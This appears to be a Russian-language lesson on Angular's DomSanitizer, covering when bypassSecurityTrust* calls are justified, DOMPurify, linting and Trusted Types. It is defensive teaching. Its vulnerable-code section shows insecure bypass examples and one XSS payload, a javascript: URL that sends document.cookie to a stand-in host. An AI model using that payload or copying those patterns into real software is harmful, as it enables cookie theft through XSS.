`DomSanitizer` — сервис Angular, который санитизирует значения и позволяет **явно пометить** значение как доверенное. Методы `bypassSecurityTrust*` — самая опасная часть API Angular: каждый их вызов отключает защиту от XSS для конкретного значения.

## Методы

```ts
const sanitizer = inject(DomSanitizer);

sanitizer.bypassSecurityTrustHtml(html); // SafeHtml
sanitizer.bypassSecurityTrustStyle(css); // SafeStyle
sanitizer.bypassSecurityTrustUrl(url); // SafeUrl — для href/src обычных ресурсов
sanitizer.bypassSecurityTrustResourceUrl(url); // SafeResourceUrl — iframe, script, embed
sanitizer.bypassSecurityTrustScript(js); // SafeScript

sanitizer.sanitize(SecurityContext.HTML, html); // явная санитизация, возвращает строку или null
```

`bypass*` **не проверяет** значение. Он оборачивает строку в объект-маркер, увидев который Angular пропускает санитизацию.

## Когда bypass оправдан

### Встраивание видео в iframe

```ts
@Component({
  selector: 'app-video',
  template: `<iframe [src]="safeUrl()" allowfullscreen></iframe>`,
})
export class Video {
  private readonly sanitizer = inject(DomSanitizer);
  readonly videoId = input.required<string>();

  protected readonly safeUrl = computed(() => {
    const id = this.videoId();
    if (!/^[A-Za-z0-9_-]{11}$/.test(id)) {
      throw new Error('Некорректный идентификатор видео');
    }
    // Доверяем только собранному нами URL на известном домене
    return this.sanitizer.bypassSecurityTrustResourceUrl(`https://www.youtube-nocookie.com/embed/${id}`);
  });
}
```

Ключевое: пользователь контролирует только `id`, который проверен по строгому шаблону, а домен и путь задаём мы.

### Ссылки на нестандартные протоколы

```ts
// Angular заблокирует tel: в старых версиях / нестандартные схемы приложений
this.sanitizer.bypassSecurityTrustUrl(`myapp://open?doc=${encodeURIComponent(docId)}`);
```

### Статический доверенный HTML из вашего бандла

Например, иконки SVG, которые хранятся в коде приложения.

## Когда bypass — уязвимость

```ts
// Плохо: HTML от пользователя или с сервера без очистки
this.content = this.sanitizer.bypassSecurityTrustHtml(comment.body);

// Плохо: URL из параметров
this.link = this.sanitizer.bypassSecurityTrustUrl(this.route.snapshot.queryParamMap.get('next')!);
// ?next=javascript:fetch('//evil.ru?c='+document.cookie)

// Плохо: «чтобы убрать предупреждение в консоли»
```

> [!WARNING]
> Предупреждение «sanitizing HTML stripped some content» — это не ошибка, а сообщение о том, что защита сработала. Не убирайте его через `bypassSecurityTrustHtml`. Разберитесь, что именно удалено и почему оно оказалось в данных.

## Безопасный пользовательский HTML

Если продукт требует показывать форматированный HTML пользователей (редактор статей, письма):

1. Санитизировать на **сервере** при сохранении по строгому белому списку тегов и атрибутов.
2. На клиенте — обычный `[innerHTML]` (санитайзер Angular как второй слой). Если нужны теги, которые Angular удаляет (например, `<iframe>` из белого списка видеохостингов), использовать проверенную библиотеку DOMPurify с конфигурацией, и только её результат передавать в `bypassSecurityTrustHtml`:

```ts
import DOMPurify from 'dompurify';

protected readonly safeBody = computed(() =>
  this.sanitizer.bypassSecurityTrustHtml(
    DOMPurify.sanitize(this.article().body, {
      ALLOWED_TAGS: ['p', 'b', 'i', 'a', 'ul', 'ol', 'li', 'blockquote', 'code', 'pre'],
      ALLOWED_ATTR: ['href', 'title'],
    }),
  ),
);
```

3. Рендерить пользовательский контент без HTML вообще — Markdown с отключёнными HTML-вставками или собственный формат.

## Где искать bypass в проекте

```bash
grep -rn "bypassSecurityTrust" src/
```

Каждое вхождение должно иметь комментарий с обоснованием и проверку входных данных. Хорошая практика — запретить `bypassSecurityTrust*` линтером и разрешать точечно через `// eslint-disable-next-line` с объяснением, чтобы любой новый вызов попадал на ревью.

## Trusted Types и Angular

При включённых Trusted Types (см. [следующий урок](/tracks/security/csp-trusted-types)) Angular создаёт Trusted Types-политики `angular` (для санитизированных значений) и `angular#unsafe-bypass` (для значений из `bypass*`). Политику `angular#unsafe-bypass` можно не разрешать в CSP — тогда любой bypass в приложении сломается на уровне браузера, что гарантирует его отсутствие.

> [!INTERVIEW]
> «Когда допустимо использовать bypassSecurityTrustHtml?» — Только для значений, источник которых полностью контролирует приложение (статические строки в коде) или которые прошли надёжную санитизацию по белому списку (DOMPurify с конфигурацией) — и никогда «чтобы убрать предупреждение». Для URL безопаснее собирать адрес самим из проверенных частей (строгий формат id на фиксированном домене), чем доверять строке целиком.

## Коротко

- `bypassSecurityTrust*` отключает защиту для значения и ничего не проверяет.
- Оправдан для собранных вами URL из проверенных частей и для статических доверенных строк.
- Пользовательский HTML — санитизация на сервере + DOMPurify, если Angular удаляет нужное.
- Каждый вызов bypass — с обоснованием, проверкой и ревью; можно запретить линтером.
- С Trusted Types можно запретить bypass на уровне браузера.
